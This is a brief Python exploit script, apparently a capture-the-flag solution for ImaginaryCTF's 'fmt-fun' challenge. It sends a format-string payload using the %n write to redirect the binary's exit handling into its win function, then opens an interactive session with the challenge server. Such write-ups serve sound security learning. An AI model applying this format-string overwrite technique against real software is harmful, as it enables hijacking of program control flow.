#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./chall")
host = args.HOST or "fmt-fun.chal.imaginaryctf.org"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *win
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()
fini_addr = 0x403DB8
buf = 0x404040
payload = f"%{buf-fini_addr+0x10}c%26$n".encode("latin-1").ljust(0x10, b"\x00") + p(
    exe.sym.win
)  # +0x10 to skip our format string payload and jump to win function
sl(payload)
io.interactive()
